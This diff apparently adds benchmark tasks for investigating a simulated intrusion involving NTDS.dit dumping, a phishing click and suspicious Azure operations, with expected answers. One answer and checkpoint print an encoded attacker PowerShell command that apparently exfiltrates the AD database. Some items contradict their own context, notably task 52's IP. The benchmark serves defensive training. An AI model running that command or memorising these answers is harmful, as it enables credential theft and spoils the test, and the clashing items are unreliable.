@@ -1,0 +1,185 @@
+tasks:
+  - task_id: incident_322_task_51
+    title: incident_322_task_51
+    description: "Can you identify the email of the user who performed the suspicious Azure Resource Management activities in this incident?"
+
+    inherit_shared: true
+
+    initial_context:
+      incident_context: "There was a multi-stage security incident detected involving the use of Ntdsutil to gather Active Directory information. This might indicate an attacker preparing to move laterally within the network. Additionally, Microsoft Defender for Resource Manager detected a resource management operation from a suspicious proxy IP address. This suspicious activity often involves threat actors trying to hide their source IP. Following this, there was a detection of suspicious Azure Resource Management (ARM) activities by a user account during a risky session."
+      question: "Can you identify the email of the user who performed the suspicious Azure Resource Management activities in this incident?"
+
+    submission_evaluation_config:
+      strategy: static
+      criteria:
+        expected_answers:
+        - "Hailey Johnson@vnevado.alpineskihouse.co"
+      scoring:
+        max_score: 1.0
+    subtasks:
+      - subtask_id: checkpoint_1
+        title: Checkpoint 1
+        description: "There is a collection of active directory information with ntutil.exe on host `vnevado-dc`."
+        objective: "Identify key details related to the potential compromise that might help in solving the main task."
+      - subtask_id: checkpoint_2
+        title: Checkpoint 2
+        description: "There is a suspicious Azure Resource Manager operation from a proxy IP address `253.1.244.215`."
+        objective: "Identify key details related to the potential compromise that might help in solving the main task."
+      - subtask_id: checkpoint_3
+        title: Checkpoint 3
+        description: "There are suspicious Azure Resource Management activities by a risky user with the account email `Hailey Johnson@vnevado.alpineskihouse.co`."
+        objective: "Identify key details related to the potential compromise that might help in solving the main task."
+  - task_id: incident_322_task_52
+    title: incident_322_task_52
+    description: "What is the IP address detected in the proxy logs for the malicious URL connection?"
+
+    inherit_shared: true
+
+    initial_context:
+      incident_context: "A file `powershell.exe` with ProcessId 2556 and `ntdsutil.exe` with ProcessId 6748 were observed as part of a recent security incident where attackers might be using Ntdsutil to gather Active Directory information. This incident is marked by various alerts. In a subsequent alert, a suspicious resource management operation was detected from a proxy IP address, followed by a malicious URL clicked on a device. The incident concluded with a connection from IP address 231.60.52.209 to login.micro.demo.antoinetest.ovh identified in the proxy logs."
+      question: "What is the IP address detected in the proxy logs for the malicious URL connection?"
+
+    submission_evaluation_config:
+      strategy: static
+      criteria:
+        expected_answers:
+        - "228.3.31.94"
+      scoring:
+        max_score: 1.0
+    subtasks:
+      - subtask_id: checkpoint_1
+        title: Checkpoint 1
+        description: "An attacker is collecting Active Directory information with ntdsutil.exe on host `vnevado-dc`."
+        objective: "Identify key details related to the potential compromise that might help in solving the main task."
+      - subtask_id: checkpoint_2
+        title: Checkpoint 2
+        description: "A suspicious Azure Resource Manager operation was performed through a proxy IP address associated with the email account `Hailey Johnson@vnevado.alpineskihouse.co`."
+        objective: "Identify key details related to the potential compromise that might help in solving the main task."
+      - subtask_id: checkpoint_3
+        title: Checkpoint 3
+        description: "A malicious URL was clicked on the device `vnevado-win11h`."
+        objective: "Identify key details related to the potential compromise that might help in solving the main task."
+      - subtask_id: checkpoint_4
+        title: Checkpoint 4
+        description: "Suspicious connection from IP address `228.3.31.94` was detected in proxy logs going to login.micro.demo.antoinetest.ovh, associated with the device `vnevado-win11h.vnevado.alpineskihouse.co`."
+        objective: "Identify key details related to the potential compromise that might help in solving the main task."
+  - task_id: incident_322_task_53
+    title: incident_322_task_53
+    description: "After the email containing a malicious URL was sent, it appears a user clicked on it. Can you identify the email recipient who clicked on the potentially malicious URL?"
+
+    inherit_shared: true
+
+    initial_context:
+      incident_context: "In the course of a security incident, an email containing a malicious URL (`dj01161621.bravesand-e1ccd718.eastus.azurecontainerapps.io`) was sent from `raphaelt@vnevado.alpineskihouse.co`. The sender's IP address was `202.205.215.225`. The email was addressed to Hailey Johnson (`Hailey Johnson@vnevado.alpineskihouse.co`) whose user ID is `5e5dd0bd-f7ed-4583-8e9e-52f91e31a360`. The email was delivered but later removed due to the malicious URL it contained. Can you identify the email recipient who clicked on the potentially malicious URL?"
+      question: "After the email containing a malicious URL was sent, it appears a user clicked on it. Can you identify the email recipient who clicked on the potentially malicious URL?"
+
+    submission_evaluation_config:
+      strategy: static
+      criteria:
+        expected_answers:
+        - "alyssat@vnevado.alpineskihouse.co"
+      scoring:
+        max_score: 1.0
+    subtasks:
+      - subtask_id: checkpoint_1
+        title: Checkpoint 1
+        description: "The email account `alyssat@vnevado.alpineskihouse.co` received an email with a malicious URL."
+        objective: "Identify key details related to the potential compromise that might help in solving the main task."
+      - subtask_id: checkpoint_2
+        title: Checkpoint 2
+        description: "The user with the email account `alyssat@vnevado.alpineskihouse.co` clicked on the malicious URL."
+        objective: "Identify key details related to the potential compromise that might help in solving the main task."
+  - task_id: incident_322_task_54
+    title: incident_322_task_54
+    description: "What command was executed using `powershell.exe` in the final alert related to Ntdsutil collecting Active Directory information?"
+
+    inherit_shared: true
+
+    initial_context:
+      incident_context: "As part of a recent security incident, a user named Alyssa from Vnevado Alpha Ski House clicked on a potentially malicious URL. This was detected on 2024-08-01 at 12:44:53.271124+00:00 and was addressed in subsequent alerts about email messages containing malicious URLs being removed after delivery as well as a suspicious Azure Resource Manager operation from a proxy IP address."
+      question: "What command was executed using `powershell.exe` in the final alert related to Ntdsutil collecting Active Directory information?"
+
+    submission_evaluation_config:
+      strategy: static
+      criteria:
+        expected_answers:
+        - "\"powershell.exe\" -encodedcommand iabuahqazabzahuadabpagwalgblahgazqagaccayqbjacaaaqagag4adabkahmajwagaccaaqbmag0ajwagaccaywbyaguayqb0aguaiabmahuababsacaaywa6afwadablag0acaanacaacqagaheaowagacaadwbnaguadaagaggadab0ahaacwa6ac8alwbnagkadaboahuaygauagmabwbtac8acgazag0abwb0aguaywbvag4adabyag8abaavaecaaabvahmadabwageaywbrac0aqwbvag0acabpagwazqbkaeiaaqbuageacgbpaguacwavahiayqb3ac8abqbhahmadablahialwbsahuaygblahuacwauaguaeablacaalqbvahuadabmagkabablacaadablahmadaauaguaeablacaalqb1ahmazqbiageacwbpagmacabhahiacwbpag4azwa7acaaiabpag4adgbvagsazqatahiazqbzahqabqblahqaaabvagqaiaatag0azqb0aggabwbkacaazwblahqaiaatahuacgbpacaadgblagmadabvahiacwbhag4azabhahiacgbvahcacwauagmabwbtacaalqb1ahmazqbiageacwbpagmacabhahiacwbpag4azwa7acaaiabpag4acwb0ageababsac0abqbvagqadqbsaguaiabhahoalgbhagmaywbvahuabgb0ahmaiaatahmaywbvahaazqagaemadqbyahiazqbuahqavqbzaguacgagac0argbvahiaywbladsaiabpag4acwb0ageababsac0abqbvagqadqbsaguaiabhahoalgbzahqabwbyageazwblacaaiaatahmaywbvahaazqagaemadqbyahiazqbuahqavqbzaguacgagac0argbvahiaywbladsaiaagaemabwbuag4azqbjahqalqbbahoaqqbjagmabwb1ag4adaagac0asqbkaguabgb0agkadab5adsaiaagacqargbpagwazqagacaaiaagacaaiaagacaaiaagacaaiaagad0aiaanagmaogbcahqazqbtahaaxabbagmadabpahyazqagaeqaaqbyaguaywb0ag8acgb5afwabgb0agqacwauagqaaqb0accaowagacaajabzacaapqagagcazqb0ac0ayqb6ahmadabvahiayqbnaguaqqbjagmabwb1ag4adaa7acaaiaakagmabwbuahqazqb4ahqaiaa9acaajabzac4aqwbvag4adablahgadaa7acaaiaakaemabwbuahqayqbpag4azqbyae4ayqbtaguaiaa9acaaigbhahuadabvag0ayqb0agkabwbuaciaowagacaajabcagwabwbiadmasabuacaapqagaeaaewagacaaiaagacaargbpagwazqagacaaiaagacaaiaagacaaiaagacaaiaagad0aiaakaeyaaqbsaguaowagacaaiaagacaaqwbvag4adabhagkabgblahiaiaagacaaiaagacaaiaagad0aiaakaemabwbuahqayqbpag4azqbyae4ayqbtaguaowagacaaiaagacaaqgbsag8aygagacaaiaagacaaiaagacaaiaagacaaiaagad0aiaanaekabqbhagcazqawadaamwauagoacabnaccaowagacaaiaagacaaqwbvag4adablahgadaagacaaiaagacaaiaagacaaiaagad0aiaakagmabwbuahqazqb4ahqaowagacaaiaagacaauwb0ageabgbkageacgbkaeiababvagiavabpaguacgagad0aiaanaeeacgbjaggaaqb2aguajwa7acaaiaagah0aowagafmazqb0ac0aqqb6afmadabvahiayqbnaguaqgbsag8aygbdag8abgb0aguabgb0acaaqabcagwabwbiadmasabuadsaiaagaa=="
+      scoring:
+        max_score: 1.0
+    subtasks:
+      - subtask_id: checkpoint_1
+        title: Checkpoint 1
+        description: "A user with an email address `alyssat@vnevado.alpineskihouse.co` clicked on a potentially malicious URL."
+        objective: "Identify key details related to the potential compromise that might help in solving the main task."
+      - subtask_id: checkpoint_2
+        title: Checkpoint 2
+        description: "An email containing a malicious URL that was delivered to the account with AadUserId `5e5dd0bd-f7ed-4583-8e9e-52f91e31a360` was later removed."
+        objective: "Identify key details related to the potential compromise that might help in solving the main task."
+      - subtask_id: checkpoint_3
+        title: Checkpoint 3
+        description: "There was a suspicious Azure Resource Manager operation from a proxy IP address on the host `vnevado-dc`."
+        objective: "Identify key details related to the potential compromise that might help in solving the main task."
+      - subtask_id: checkpoint_4
+        title: Checkpoint 4
+        description: "A process with Process ID `2556` initiated with the command line `powershell.exe -encodedcommand iabuahqazabzahuadabpagwalgblahgazqagaccayqbjacaaaqagag4adabkahmajwagaccaaqbmag0ajwagaccaywbyaguayqb0aguaiabmahuababsacaaywa6afwadablag0acaanacaacqagaheaowagacaadwbnaguadaagaggadab0ahaacwa6ac8alwbnagkadaboahuaygauagmabwbtac8acgazag0abwb0aguaywbvag4adabyag8abaavaecaaabvahmadabwageaywbrac0aqwbvag0acabpagwazqbkaeiaaqbuageacgbpaguacwavahiayqb3ac8abqbhahmadablahialwbsahuaygblahuacwauaguaeablacaalqbvahuadabmagkabablacaadablahmadaauaguaeablacaalqb1ahmazqbiageacwbpagmacabhahiacwbpag4azwa7acaaiabpag4adgbvagsazqatahiazqbzahqabqblahqaaabvagqaiaatag0azqb0aggabwbkacaazwblahqaiaatahuacgbpacaadgblagmadabvahiacwbhag4azabhahiacgbvahcacwauagmabwbtacaalqb1ahmazqbiageacwbpagmacabhahiacwbpag4azwa7acaaiabpag4acwb0ageababsac0abqbvagqadqbsaguaiabhahoalgbhagmaywbvahuabgb0ahmaiaatahmaywbvahaazqagaemadqbyahiazqbuahqavqbzaguacgagac0argbvahiaywbladsaiabpag4acwb0ageababsac0abqbvagqadqbsaguaiabhahoalgbzahqabwbyageazwblacaaiaatahmaywbvahaazqagaemadqbyahiazqbuahqavqbzaguacgagac0argbvahiaywbladsaiaagaemabwbuag4azqbjahqalqbbahoaqqbjagmabwb1ag4adaagac0asqbkaguabgb0agkadab5adsaiaagacqargbpagwazqagacaaiaagacaaiaagacaaiaagacaaiaagad0aiaanagmaogbcahqazqbtahaaxabbagmadabpahyazqagaeqaaqbyaguaywb0ag8acgb5afwabgb0agqacwauagqaaqb0accaowagacaajabzacaapqagagcazqb0ac0ayqb6ahmadabvahiayqbnaguaqqbjagmabwb1ag4adaa7acaaiaakagmabwbuahqazqb4ahqaiaa9acaajabzac4aqwbvag4adablahgadaa7acaaiaakaemabwbuahqayqbpag4azqbyae4ayqbtaguaiaa9acaaigbhahuadabvag0ayqb0agkabwbuaciaowagacaajabcagwabwbiadmasabuacaapqagaeaaewagacaaiaagacaargbpagwazqagacaaiaagacaaiaagacaaiaagacaaiaagad0aiaakaeyaaqbsaguaowagacaaiaagacaaqwbvag4adabhagkabgblahiaiaagacaaiaagacaaiaagad0aiaakaemabwbuahqayqbpag4azqbyae4ayqbtaguaowagacaaiaagacaaqgbsag8aygagacaaiaagacaaiaagacaaiaagacaaiaagad0aiaanaekabqbhagcazqawadaamwauagoacabnaccaowagacaaiaagacaaqwbvag4adablahgadaagacaaiaagacaaiaagacaaiaagad0aiaakagmabwbuahqazqb4ahqaowagacaaiaagacaauwb0ageabgbkageacgbkaeiababvagiavabpaguacgagad0aiaanaeeacgbjaggaaqb2aguajwa7acaaiaagah0aowagafmazqb0ac0aqqb6afmadabvahiayqbnaguaqgbsag8aygbdag8abgb0aguabgb0acaaqabcagwabwbiadmasabuadsaiaagaa==`."
+        objective: "Identify key details related to the potential compromise that might help in solving the main task."
+  - task_id: incident_322_task_55
+    title: incident_322_task_55
+    description: "In relation to the Azure Resource Manager operation from the suspicious proxy IP address, what is the file name of the process that might be used to gather information for persistence or lateral movement in a network?"
+
+    inherit_shared: true
+
+    initial_context:
+      incident_context: "A security incident involving multiple suspicious activities was noted, starting with a malicious URL being clicked on a device with hostname `vnevado-win11h`. This led to further investigation where a suspicious Azure Resource Manager operation from a proxy IP was detected suggesting possible malicious behavior."
+      question: "In relation to the Azure Resource Manager operation from the suspicious proxy IP address, what is the file name of the process that might be used to gather information for persistence or lateral movement in a network?"
+
+    submission_evaluation_config:
+      strategy: static
+      criteria:
+        expected_answers:
+        - "ntdsutil.exe"
+      scoring:
+        max_score: 1.0
+    subtasks:
+      - subtask_id: checkpoint_1
+        title: Checkpoint 1
+        description: "The attacker launched ntdsutil with the extracted file name `ntdsutil.exe` to gather information from Active Directory."
+        objective: "Identify key details related to the potential compromise that might help in solving the main task."
+      - subtask_id: checkpoint_2
+        title: Checkpoint 2
+        description: "A suspicious Azure Resource Manager operation was detected from the host `vnevado-dc`, which is associated with a proxy IP."
+        objective: "Identify key details related to the potential compromise that might help in solving the main task."
+      - subtask_id: checkpoint_3
+        title: Checkpoint 3
+        description: "A malicious URL was clicked by the Azure AD user with AadUserId `5e5dd0bd-f7ed-4583-8e9e-52f91e31a360`."
+        objective: "Identify key details related to the potential compromise that might help in solving the main task."
+  - task_id: incident_322_task_56
+    title: incident_322_task_56
+    description: "What was the sender IP address of the email messages containing the malicious URL?"
+
+    inherit_shared: true
+
+    initial_context:
+      incident_context: "A security incident involving a suspicious credential dump from NTDS.dit and an Azure resource management operation from a suspicious proxy IP address was identified. Furthermore, there were email messages that contained a malicious URL which were delivered and later removed."
+      question: "What was the sender IP address of the email messages containing the malicious URL?"
+
+    submission_evaluation_config:
+      strategy: static
+      criteria:
+        expected_answers:
+        - "202.205.215.225"
+      scoring:
+        max_score: 1.0
+    subtasks:
+      - subtask_id: checkpoint_1
+        title: Checkpoint 1
+        description: "There was a suspicious credential dump from NTDS.dit on host `vnevado-dc`."
+        objective: "Identify key details related to the potential compromise that might help in solving the main task."
+      - subtask_id: checkpoint_2
+        title: Checkpoint 2
+        description: "A resource management operation from a suspicious proxy IP address was initiated by an account with SID `S-1-5-21-1840151686-3534835288-156286563-1127`."
+        objective: "Identify key details related to the potential compromise that might help in solving the main task."
+      - subtask_id: checkpoint_3
+        title: Checkpoint 3
+        description: "An email message containing a malicious URL, sent from IP address `202.205.215.225`, was delivered and later removed."
+        objective: "Identify key details related to the potential compromise that might help in solving the main task."
